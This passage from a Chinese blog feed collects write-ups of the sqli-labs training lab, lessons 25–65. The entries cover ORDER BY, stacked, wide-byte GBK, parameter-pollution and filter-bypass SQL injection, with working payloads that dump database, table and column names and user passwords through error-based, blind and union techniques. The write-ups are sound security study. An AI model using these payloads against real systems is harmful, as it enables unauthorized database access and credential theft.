title="lesson61："></a>lesson61：</h1><p>同lesson58，注入类型变为<code>&#39;))</code></p><h1 id="lesson62"><a href="#lesson62" class="headerlink" title="lesson62:"></a>lesson62:</h1><p>sql语法错误时不会回显报错，那么报错注入也没法用了，只能延时注入。</p><h2 id="lesson63、64、65："><a href="#lesson63、64、65：" class="headerlink" title="lesson63、64、65："></a>lesson63、64、65：</h2><p>同lesson62，仅改变注入类型。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;lesson54：&quot;&gt;&lt;a href=&quot;#lesson54：&quot; class=&quot;headerlink&quot; title=&quot;lesson54：&quot;&gt;&lt;/a&gt;lesson54：&lt;/h1&gt;&lt;p&gt;我们通过查看蓝字可以大致明白这关的意思：输入payload的次数小等于十次的情况下获</summary>
      
    
    
    
    
    <category term="sqlilabs" scheme="http://example.com/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>lesson46-53</title>
    <link href="http://example.com/2021/02/07/lesson46-53/"/>
    <id>http://example.com/2021/02/07/lesson46-53/</id>
    <published>2021-02-07T10:56:07.000Z</published>
    <updated>2021-02-09T11:09:55.707Z</updated>
    
    <content type="html"><![CDATA[<h1 id="background——Order-by后的注入："><a href="#background——Order-by后的注入：" class="headerlink" title="background——Order by后的注入："></a>background——Order by后的注入：</h1><p> 查看mysql官方select的文档：</p><p><img src="/2021/02/07/lesson46-53/1.jpg" alt="1"></p><p>由于order by 后面只能接(字段名，表达式，位置)等信息，我们并不能向原来一样使用联合查询。</p><p>查看lesson46的源码：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$id=$_GET[&#x27;sort&#x27;];</span><br><span class="line">if(isset($id))</span><br><span class="line">&#123;</span><br><span class="line">//logging the connection parameters to a file for analysis.</span><br><span class="line">$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);</span><br><span class="line">fwrite($fp,&#x27;SORT:&#x27;.$id.&quot;\n&quot;);</span><br><span class="line">fclose($fp);</span><br><span class="line">$sql = &quot;<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> $<span class="keyword">id</span><span class="string">&quot;;</span></span><br></pre></td></tr></table></figure><p>我们看到这关我们的输入应该是?sort=，而不再是?id=。我们输入?sort=1，即对第一列进行升序排序，且参数值要小等于列数，否则会报错（如有一个表有三列，?sort=4，页面就会报错）。</p><h2 id="lesson46："><a href="#lesson46：" class="headerlink" title="lesson46："></a>lesson46：</h2><p>我们查看源码可知这是数字型注入，那么我们<strong>怎么判断是否存在order by后的注入呢？</strong>我们可以通过对比输入<code>?sort=1 desc</code>和<code>?sort=1 asc</code>（desc降序，asc升序）的返回页面来判断是否存在order by后的注入——若两者返回值不同，则说明存在order by后的注入。</p><p>这关的payload句式有三种：</p><ol><li>?sort=(select ······)</li><li>?sort=1 and (select ······)</li><li>?sort=rand(······)</li></ol><p>注：句式(1)和(2)没有本质上的区别。</p><h3 id="解法一-报错注入："><a href="#解法一-报错注入：" class="headerlink" title="解法一.报错注入："></a>解法一.报错注入：</h3><h4 id="爆库："><a href="#爆库：" class="headerlink" title="爆库："></a>爆库：</h4><p>?sort=1 and updatexml(1,concat(‘~’, database()),1)</p><h4 id="爆表："><a href="#爆表：" class="headerlink" title="爆表："></a>爆表：</h4><p>?sort=1 and updatexml(1,concat(‘~’,(select group_concat(table_name) from information_schema.tables where table_schema=’security’)),1)</p><h4 id="爆列："><a href="#爆列：" class="headerlink" title="爆列："></a>爆列：</h4><p>?sort=1 and updatexml(1,concat(‘~’,(select group_concat(column_name) from information_schema.columns where table_name=’users’ and table_schema=’security’)),1)</p><h4 id="爆值："><a href="#爆值：" class="headerlink" title="爆值："></a>爆值：</h4><p>?sort=1 and updatexml(1,concat(‘~’,(select * from (select concat_ws(‘ ‘,id,username,password) from users limit 0,1) x)),1)</p><p>注：这边不知道为什么<code>&#39;#&#39;</code>不能用了，找了半天原因。</p><h2 id="解法二-布尔盲注："><a href="#解法二-布尔盲注：" class="headerlink" title="解法二.布尔盲注："></a>解法二.布尔盲注：</h2><p>SQL 像 PHP，也是一种弱类型，它会认为<code>true=1</code>，<code>false=0</code>。用在<code>order by</code>后会直接导致显示不同：</p><p>A:<img src="/2021/02/07/lesson46-53/image-20210209171458273.png" alt="image-20210209171458273"></p><p>B:<img src="/2021/02/07/lesson46-53/2.png" alt="2"></p><p>C:<img src="/2021/02/07/lesson46-53/3.png" alt="3"></p><p>通过对比A,C我们可以发现，<code>order by</code>后接返回数字或布尔值（因为是弱类型，布尔值返回仍是数字）的语句是<strong>没有作用</strong>的！也就是说我们无法使用句式一、二进行布尔盲注，那么我们能不能使用句式三进行布尔盲注呢？</p><p>我们先输入：?sort=rand(true)<img src="/2021/02/07/lesson46-53/4.png" alt="4"></p><p>再输入：?sort=rand(false)<img src="/2021/02/07/lesson46-53/5.png" alt="5"></p><p>我们可以看到两种得到的返回不同，那么就说明我们可以利用句式三来进行布尔盲注。</p><p><strong>Q:其实这边有一个疑问，不是说order by后接的数字不起作用吗，为什么rand函数的返回值也是数字，但是却可以起作用呢？我突然有个猜想——order by后接字符、字符串或布尔值是不起作用的，也就是说数据库返回值不会根据字符串的不同而不同，如果是这样就可以理解为什么了,可是在我用时间盲注解这关的时候if函数返回值是1但是页面返回却和?sort=1的不同。我蒙了，算了，挖个坑吧！！！！！！！！！！！！！！！！！</strong></p><p>我们的布尔盲注思路是这样的：?sort=rand（sql语句），如果sql语句正确，那么页面的返回会和?sort=rand(true)一样（利用了rand函数的伪随机性），反之和?sort=rand(false)一样。</p><p><strong>sp：rand()函数是个随机函数，返回0~1间的小数。使用时也可以给定参数值（随机种子），相同的参数生成的结果也相同（伪随机性）。</strong></p><h3 id="爆库：-1"><a href="#爆库：-1" class="headerlink" title="爆库："></a>爆库：</h3><p>?sort=rand(left(database(),8)=’security’)<img src="/2021/02/07/lesson46-53/6.png" alt="6"></p><p>我们看到页面返回与?sort=rand(true)的一样，说明数据库名就是security。</p><p>后续的爆表，爆列等也是这样，构造payload然后比对页面返回得结果。不多赘述。</p><h2 id="解法三-时间盲注："><a href="#解法三-时间盲注：" class="headerlink" title="解法三.时间盲注："></a>解法三.时间盲注：</h2><p>时间注入可以利用句式一或者句式二。在这里我们就简单的拿爆库举个例子，剩下的参考时间盲注那一关的笔记。</p><p>爆库：?sort=if(mid(database(),1,8)=’security’,1,sleep(5))</p><h2 id="lesson47："><a href="#lesson47：" class="headerlink" title="lesson47："></a>lesson47：</h2><p>和lesson46一样，注意注入类型的变化做出适当改变（包括句式的改变还有添加注释符等）即可。</p><h2 id="lesson48："><a href="#lesson48：" class="headerlink" title="lesson48："></a>lesson48：</h2><p>同lesson46，但是页面不再出现报错回显，故报错注入不可用。</p><h2 id="lesson49："><a href="#lesson49：" class="headerlink" title="lesson49："></a>lesson49：</h2><p>同lesson47，但是页面不再出现报错回显，故报错注入不可用。</p><h2 id="lesson50、51、52-、53："><a href="#lesson50、51、52-、53：" class="headerlink" title="lesson50、51、52 、53："></a>lesson50、51、52 、53：</h2><p>就是之前学的堆叠注入加上新学的order by后的注入，没什么新颖的，打组合拳就好了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;background——Order-by后的注入：&quot;&gt;&lt;a href=&quot;#background——Order-by后的注入：&quot; class=&quot;headerlink&quot; title=&quot;background——Order by后的注入：&quot;&gt;&lt;/a&gt;background—</summary>
      
    
    
    
    
    <category term="sqlilabs" scheme="http://example.com/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>lesson38-45</title>
    <link href="http://example.com/2021/02/06/lesson38-45/"/>
    <id>http://example.com/2021/02/06/lesson38-45/</id>
    <published>2021-02-06T14:44:20.000Z</published>
    <updated>2021-02-07T10:52:51.675Z</updated>
    
    <content type="html"><![CDATA[<h1 id="background——堆叠注入："><a href="#background——堆叠注入：" class="headerlink" title="background——堆叠注入："></a>background——堆叠注入：</h1><p>在 SQL 中，<code>;(分号)</code>是用来表示一条 sql 语句的结束。试想一下我们在 <code>; </code>结束一个 sql 语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。但对于不同数据库（mysql，sqlserver，oracle等）来说，除oracle不允许外，其他数据库我们可以在一条sql语句后紧接着构造下一条sql语句。</p><p><strong>这里可能会有一个问题——union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？</strong>(1)区别就在于 union 或者 union all 执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是 任意的语句。 </p><p>(2)堆叠注入不会像联合注入那样受第一句sql语句影响。我们知道联合注入要满足第一句sql语句错误的条件下才会执行后面我们构造的sql语句，而堆叠注入没有这个问题。</p><p>(3)在我们的 web 系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第 二个语句产生错误或者结果时只能被忽略，我们在前端界面是无法看到返回结果的。因此，在读取数据时，我们建议使用 union（联合）注入。例以lesson38的一个payload为例：?id=0’ union select 1,2,database();create table test like users–+这样我们可以前台获取数据信息，后台篡改数据信息，实现“双管齐下”。</p><p><strong>sp：关于数据库的一些增删改查在另一篇博客已经专门介绍了，这里不多赘述。</strong></p><h2 id="lesson38："><a href="#lesson38：" class="headerlink" title="lesson38："></a>lesson38：</h2><p>认识一下新函数：</p><ul><li><p>mysqli_connect()函数：<br>功能：打开一个到 MySQL 服务器的新的连接。<br>语法：mysqli_connect(host,username,password,dbname,port,socket)；<img src="/2021/02/06/lesson38-45/1.png" alt="1"></p></li><li><p>mysqli_select_db()函数：<br>作用：用于更改连接的默认数据库。<br>语法：mysqli_select_db(connection,dbname)<img src="/2021/02/06/lesson38-45/2.png" alt="2"></p></li><li><p>mysqli_multi_query()函数：<br>语法：mysqli_multi_query(connection,query)；</p><p>功能：执行一个或多个针对数据库的查询。多个查询用分号进行分隔。<img src="/2021/02/06/lesson38-45/3.jpg" alt="3"></p><p><strong>注：这个函数是可实现堆叠注入的重要因素！</strong></p></li><li><p>mysql_store_result()函数：<br>功能：用于将mysqli_query()查询的结果集存储到变量中</p></li><li><p>mysqli_more_results()函数：<br>语法：mysqli_more_results(connection);<br>参数：connection——必需。规定要使用的mysql连接<br>功能：检查一个多查询是否有更多的结果。</p></li><li><p>mysqli_fetch_row() 函数：</p><p>语法：mysqli_fetch_row(result)；</p><p>参数：result——必须。规定由 mysqli_query()、mysqli_store_result() 或 mysqli_use_result() 返回的结果  集标识符。</p><p>功能：从结果集中取得一行，并作为枚举数组返回。</p></li></ul><h2 id="lesson39-amp-40-amp-41："><a href="#lesson39-amp-40-amp-41：" class="headerlink" title="lesson39&amp;40&amp;41："></a>lesson39&amp;40&amp;41：</h2><p>就改变了id闭合方式，注意注入类型变化即可，其余与lesson38一致。</p><h2 id="lesson42："><a href="#lesson42：" class="headerlink" title="lesson42："></a>lesson42：</h2><p>这关可以用二阶注入，但是没必要，因为我们输入的密码没有被过滤，我们可以用报错注入，延时注入。或者用我们新学的堆叠注入。</p><p>在我们使用堆叠注入时虽然页面返回错误，但是我们在数据库中查找，还是可以看到我们的payload执行l。</p><h2 id="lesson43-amp-44-amp-45："><a href="#lesson43-amp-44-amp-45：" class="headerlink" title="lesson43&amp;44&amp;45："></a>lesson43&amp;44&amp;45：</h2><p>就改变了id闭合方式，注意注入类型变化即可，其余与lesson42一致。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;background——堆叠注入：&quot;&gt;&lt;a href=&quot;#background——堆叠注入：&quot; class=&quot;headerlink&quot; title=&quot;background——堆叠注入：&quot;&gt;&lt;/a&gt;background——堆叠注入：&lt;/h1&gt;&lt;p&gt;在 SQL 中，&lt;c</summary>
      
    
    
    
    
    <category term="sqlilabs" scheme="http://example.com/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>lesson32-37</title>
    <link href="http://example.com/2021/02/06/lesson32-37/"/>
    <id>http://example.com/2021/02/06/lesson32-37/</id>
    <published>2021-02-06T05:17:38.000Z</published>
    <updated>2021-02-26T04:39:49.159Z</updated>
    
    <content type="html"><![CDATA[<h1 id="background——宽字节注入："><a href="#background——宽字节注入：" class="headerlink" title="background——宽字节注入："></a>background——宽字节注入：</h1><ul><li><strong>原理：</strong>mysql在使用GBK编码的时候，会认为两个字符（前一个字符的ascii码必须大于128才能到汉字的范围）。）为一个汉字，例如%aa%5c就是一个汉字。</li><li>以lesson32为例，查看源码发现PHP会对<code>\（反斜杠）</code>,<code>&#39;（单引号）</code>,<code>&quot;（双引号）</code>做转义处理</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">function check_addslashes($string)</span><br><span class="line">&#123;</span><br><span class="line">    $string = preg_replace(&#x27;/&#x27;. preg_quote(&#x27;\\&#x27;) .&#x27;/&#x27;, &quot;\\\\\\&quot;, $string);          //escape any backslash</span><br><span class="line">    $string = preg_replace(&#x27;/\&#x27;/i&#x27;, &#x27;\\\&#x27;&#x27;, $string);                               //escape single quote <span class="keyword">with</span> a backslash</span><br><span class="line">    $<span class="keyword">string</span> = preg_replace(<span class="string">&#x27;/\&quot;/&#x27;</span>, <span class="string">&quot;\\\&quot;&quot;, $string);                                //escape double quote with a backslash</span></span><br><span class="line"><span class="string">      </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    return $string;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// take the variables </span></span><br><span class="line"><span class="string">if(isset($_GET[&#x27;id&#x27;]))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">$id=check_addslashes($_GET[&#x27;id&#x27;]);</span></span><br><span class="line"><span class="string">//echo &quot;</span>The filtered request <span class="keyword">is</span> :<span class="string">&quot; .$id . &quot;</span>&lt;br&gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="string">$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);</span></span><br><span class="line"><span class="string">fwrite($fp,&#x27;ID:&#x27;.$id.&quot;</span>\n<span class="string">&quot;);</span></span><br><span class="line"><span class="string">fclose($fp);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// connectivity </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mysql_query(&quot;</span><span class="keyword">SET</span> <span class="keyword">NAMES</span> gbk<span class="string">&quot;);</span></span><br><span class="line"><span class="string">$sql=&quot;</span><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">&#x27;$id&#x27;</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">&quot;;</span></span><br><span class="line"><span class="string">$result=mysql_query($sql);</span></span><br><span class="line"><span class="string">//!对于源码的解读：我认为24-26行的命令目的是将sql语句用gbk编码，以防带入数据库后乱码。</span></span><br><span class="line"><span class="string">$row = mysql_fetch_array($result);</span></span><br></pre></td></tr></table></figure><p>那么我们利用它会将sql语句转为gbk编码，通过吞并<code>\（url编码%5c）</code>的方式绕开其对单引号的转义。例如：%aa%5c，这在gbk编译后成为一个汉字。（gbk编码表<a href="https://www.qqxiuzi.cn/zh/hanzi-gbk-bianma.php%EF%BC%89%E6%AF%94%E5%A6%82">https://www.qqxiuzi.cn/zh/hanzi-gbk-bianma.php）比如</a> <code>乗</code> 字符，GBK编码 %81%5C</p><p><strong>补充：</strong>有些符号（<code>#</code> <code>$</code> <code>^</code> <code>&amp;</code> <code>* </code> <code>+</code> =）在URL中是不能直接传递的，如果要在URL中传递这些特殊符号，那么就要使用他们的编码了。编码的格式为：%加字符的ASCII码，即一个百分号%，后面跟对应字符的ASCII（16进制）码值。（URL编码就是在uft-8编码的基础上，给编码的每个字节加上百分号。）</p><h2 id="lesson32："><a href="#lesson32：" class="headerlink" title="lesson32："></a>lesson32：</h2><h3 id="爆库："><a href="#爆库：" class="headerlink" title="爆库："></a>爆库：</h3><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;%aa&#39; union select 1,2,database()--+</span><br></pre></td></tr></table></figure><h3 id="爆表："><a href="#爆表：" class="headerlink" title="爆表："></a>爆表：</h3><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;%aa&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;0x7365637572697479--+</span><br></pre></td></tr></table></figure><p>注：爆表本应该是?id=%aa’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’–+</p><p>但是因为PHP对<code>&#39;</code>转义，那么我们可以用十六进制来表示security</p><h3 id="爆列："><a href="#爆列：" class="headerlink" title="爆列："></a>爆列：</h3><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;%aa&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;0x7365637572697479--+</span><br></pre></td></tr></table></figure><h3 id="爆值："><a href="#爆值：" class="headerlink" title="爆值："></a>爆值：</h3><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;%aa&#39; union select 1,2,group_concat(username,0x2c,password) from users--+</span><br></pre></td></tr></table></figure><h2 id="lesson33："><a href="#lesson33：" class="headerlink" title="lesson33："></a>lesson33：</h2><p>和lesson32一模一样。</p><h2 id="lesson34："><a href="#lesson34：" class="headerlink" title="lesson34："></a>lesson34：</h2><p>这关我还以为会和之前两关一样，只不过改为post类型，结果发现了一些不同。</p><p>当我在username输入admin%aa’ union select 1,database()#，登入失败，按理来说不应该呀。于是我用burpsuite抓包：</p><p><img src="/2021/02/06/lesson32-37/1.png" alt="1"></p><p>我们明明输入的uname=admin%aa’ union select 1,database()#，可是我们看到多了一个<code>25</code>在%aa中间，这是什么情况呢？<strong>原来，get与post提交数据类型不同，get型如果输入符合url的格式那么就直接以url形式提交，也就是说遇到%aa这种直接当做url编码处理，而post型却不是这样，他会把你提交的%aa当做正常数据，然后进行url编码，于是就变成了%25aa。</strong></p><ul><li><p>那么我们要怎么避免这个问题呢?</p></li><li><p>我们可以用burp抓包，手动去掉<code>25</code></p></li></ul><p><strong>补充：不同类型编码</strong></p><p>UTF-16编码：一个英文字母字符或一个汉字字符存储都需要2个字节（Unicode扩展区的一些汉字存储需要4个字节）。<br>UTF-8编码：一个英文字符等于一个字节，一个中文（含繁体）等于三个字节。中文标点占三个字节，英文标点占一个字节<br>Unicode编码：一个英文等于两个字节，一个中文（含繁体）等于两个字节。中文标点占两个字节，英文标点占两个字节。</p><p>—）我们还可以用另外一种方式：?id=牛’ or 1=1#    </p><p><img src="/2021/02/06/lesson32-37/2.png" alt="2"></p><p>在经过url编码后，<code>牛</code>被编码成三个字节加上单引号一个字节，再加上单引号被转义后反斜杠一个字节，总共五个字节，我们已经知道gbk编码时两个字节为一汉字，那么这样转义单引号用的反斜杠被合并，单引号“逃逸”成功。</p><ul><li><a href="https://www.qqxiuzi.cn/bianma/Unicode-UTF.php%E5%9C%A8%E7%BA%BFUnicode%E5%92%8CUTF%E7%BC%96%E7%A0%81%E8%BD%AC%E6%8D%A2%E7%BD%91%E5%9D%80">https://www.qqxiuzi.cn/bianma/Unicode-UTF.php在线Unicode和UTF编码转换网址</a></li></ul><h2 id="lesson35："><a href="#lesson35：" class="headerlink" title="lesson35："></a>lesson35：</h2><p>没营养</p><h2 id="lesson36："><a href="#lesson36：" class="headerlink" title="lesson36："></a>lesson36：</h2><p>和lesson32一样，只不过把过滤函数改成mysql_real_escape_string（）。</p><h2 id="lesson37："><a href="#lesson37：" class="headerlink" title="lesson37："></a>lesson37：</h2><p>和lesson34一样，只不过把过滤函数改成mysql_real_escape_string（）。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;background——宽字节注入：&quot;&gt;&lt;a href=&quot;#background——宽字节注入：&quot; class=&quot;headerlink&quot; title=&quot;background——宽字节注入：&quot;&gt;&lt;/a&gt;background——宽字节注入：&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;</summary>
      
    
    
    
    
    <category term="sqlilabs" scheme="http://example.com/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>lesson29-31</title>
    <link href="http://example.com/2021/02/05/lesson29-31/"/>
    <id>http://example.com/2021/02/05/lesson29-31/</id>
    <published>2021-02-05T08:14:01.000Z</published>
    <updated>2021-02-06T05:17:19.184Z</updated>
    
    <content type="html"><![CDATA[<h1 id="background："><a href="#background：" class="headerlink" title="background："></a>background：</h1><p>首先，我们先来了解一下什么是web应用的基本架构：</p><p><img src="/2021/02/05/lesson29-31/2.png" alt="2"></p><p>lesson29这关中，服务端web应用有两个，一个是以tomcat为引擎的jsp型服务器，一个是以apache为引擎的php型服务器：</p><p><img src="/2021/02/05/lesson29-31/1675852-20190529114341522-1690756767.png" alt="img"></p><p><strong>打开indexjsp查看源码：</strong></p><p><img src="/2021/02/05/lesson29-31/5.png" alt="5"></p><p>方框内执行的是判断tomcat获取的id是否为纯数字。</p><p>接着，如果id是纯数字，它“确认安全”，就会把输入传递给apache服务器。</p><p>这过程中tomcat的作用就相当于一道waf（防火墙）。那么我们怎么绕过这个防火墙呢？</p><p>悉知，大多数服务器对参数的解析：</p><p><img src="/2021/02/05/lesson29-31/3.png" alt="3"></p><p>也就是说，当遇到多个参数时，tomcat只会获取第一个参数，对其进行上述处理，只要第一个参数复合它的要求，tomcat就会把我们的输入传递到下一级。因此我们可以利用这一特点，构造多个参数来达到目的。</p><h1 id="lesson29："><a href="#lesson29：" class="headerlink" title="lesson29："></a>lesson29：</h1><h2 id="爆库："><a href="#爆库：" class="headerlink" title="爆库："></a>爆库：</h2><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;tomcat-files&#x2F;sqli-labs&#x2F;Less-29&#x2F;?id&#x3D;1&amp;id&#x3D;0&#39;union select 1,2,database()--+</span><br></pre></td></tr></table></figure><h2 id="爆表："><a href="#爆表：" class="headerlink" title="爆表："></a>爆表：</h2><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;tomcat-files&#x2F;sqli-labs&#x2F;Less-29&#x2F;?id&#x3D;1&amp;id&#x3D;0&#39;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;--+</span><br></pre></td></tr></table></figure><h2 id="爆列："><a href="#爆列：" class="headerlink" title="爆列："></a>爆列：</h2><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;tomcat-files&#x2F;sqli-labs&#x2F;Less-29&#x2F;?id&#x3D;1&amp;id&#x3D;0&#39;union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;security&#39;--+</span><br></pre></td></tr></table></figure><h2 id="爆值："><a href="#爆值：" class="headerlink" title="爆值："></a>爆值：</h2><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;tomcat-files&#x2F;sqli-labs&#x2F;Less-29&#x2F;?id&#x3D;1&amp;id&#x3D;0&#39;union select 1,2,group_concat(username,0x3a,password) from users--+</span><br></pre></td></tr></table></figure><h1 id="lesson30："><a href="#lesson30：" class="headerlink" title="lesson30："></a>lesson30：</h1><p>注入类型：<code>&quot;</code>  ，其余一样。</p><h1 id="lesson31："><a href="#lesson31：" class="headerlink" title="lesson31："></a>lesson31：</h1><p>注入类型：<code>&quot;)</code>  ，其余一样。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;background：&quot;&gt;&lt;a href=&quot;#background：&quot; class=&quot;headerlink&quot; title=&quot;background：&quot;&gt;&lt;/a&gt;background：&lt;/h1&gt;&lt;p&gt;首先，我们先来了解一下什么是web应用的基本架构：&lt;/p&gt;
&lt;p&gt;&lt;</summary>
      
    
    
    
    
    <category term="sqlilabs" scheme="http://example.com/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>lesson25-28a</title>
    <link href="http://example.com/2021/02/04/lesson25-28a/"/>
    <id>http://example.com/2021/02/04/lesson25-28a/</id>
    <published>2021-02-04T08:26:27.000Z</published>
    <updated>2021-02-06T05:25:27.537Z</updated>
    
    <content type="html"><![CDATA[<h2 id="lesson25："><a href="#lesson25：" class="headerlink" title="lesson25："></a>lesson25：</h2><p>这一关它告诉我们and和or都被过滤了。</p><p>一般，绕开过滤的方法有以下几种：</p><p>（1）大小写变形 Or,OR,oR </p><p>（2）编码，hex，urlencode </p><p>（3）添加注释/<em>or</em>/ </p><p>（4）利用符号 and=&amp;&amp;，or=||</p><p>（5）构造字符串——oorr，anandd</p><p>我们查看源码：</p><p><img src="/2021/02/04/lesson25-28a/1.png" alt="1"></p><p>这里的or和and采用了i正则匹配，大小写都无法绕过。</p><p>{               <strong>拓展一下PHP正则表达式的模式修饰符</strong></p><ul><li>i</li></ul><p>​       如果设定此修正符，模式中的字符将同时匹配大小写字母。</p><ul><li><p>m<br>当设定了此修正符，“行起始”和“行结束”除了匹配整个字符串开头和结束外，还分别匹配其中的换行符的之后和之前。</p></li><li><p>s<br>如果设定了此修正符，模式中的圆点元字符（.）匹配所有的字符，包括换行符。没有此设定的话，则不包括换行符。</p></li><li><p>x<br>如果设定了此修正符，模式中的空白字符除了被转义的或在字符类中的以外完全被忽略，在未转义的字符类之外的 #以及下一个换行符之间的所有字符，包括两头，也都被忽略。</p></li></ul><p>}</p><p><strong>那么这关我们就以双写绕过的方式为例。</strong></p><p>查看源码：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">&#x27;$id&#x27;</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">&quot;;</span></span><br></pre></td></tr></table></figure><p>从中得知这关为单引号类型注入。</p><p>当输入?id=1时，页面有回显。那么我们可以采用union联合注入。</p><h3 id="爆库"><a href="#爆库" class="headerlink" title="爆库:"></a>爆库:</h3><p>输入：?id=0’  union select 1,2,database()–+</p><p>得，<img src="/2021/02/04/lesson25-28a/2.png" alt="2"></p><h3 id="爆表："><a href="#爆表：" class="headerlink" title="爆表："></a>爆表：</h3><p>输入：?id=0’ union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where </p><p>table_schema=’security’–+</p><p>得，<img src="/2021/02/04/lesson25-28a/3.png" alt="3"></p><p>注：information中也含有or，因此也需要做绕过处理。</p><h3 id="爆列："><a href="#爆列：" class="headerlink" title="爆列："></a>爆列：</h3><p>输入：?id=0’ union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where </p><p>table_schema=’security’–+</p><p>得，<img src="/2021/02/04/lesson25-28a/4.png" alt="4"></p><h3 id="爆值："><a href="#爆值：" class="headerlink" title="爆值："></a>爆值：</h3><p>输入：?id=0’ union select 1,2,group_concat(username,0x3a,passwoorrd) from users–+</p><p>得，<img src="/2021/02/04/lesson25-28a/5.png" alt="5"></p><p>注：password中也含有or，因此也需要做绕过处理。</p><h2 id="lesson25a"><a href="#lesson25a" class="headerlink" title="lesson25a:"></a>lesson25a:</h2><p>和lesson25没什么区别，注意注入类型就好了。</p><h2 id="lesson26："><a href="#lesson26：" class="headerlink" title="lesson26："></a>lesson26：</h2><p>查看源码：<img src="/2021/02/04/lesson25-28a/6.png" alt="6"></p><p>我们可以看到它就过滤了一堆字符。此时，我们可以采用<strong>URL编码</strong>绕过这些过滤：</p><p>+       URL 中+号表示空格                 %2B<br>空格  URL中的空格可以用+号或者编码      %20<br>/        分隔目录和子目录                   %2F<br>?        分隔实际的URL和参数               %3F<br>%       指定特殊字符                     %25<br>#       表示书签                         %23<br>&amp;       URL 中指定的参数间的分隔符         %26<br>=        URL 中指定参数的值                %3D</p><p>我不知道为什么空格我一直找不到绕开的方法，上面的几种都不行，好像是apache的问题，要我们用linux系统才能绕过。既然这样我们只能避免输入空格了，使用报错注入——</p><h3 id="爆库："><a href="#爆库：" class="headerlink" 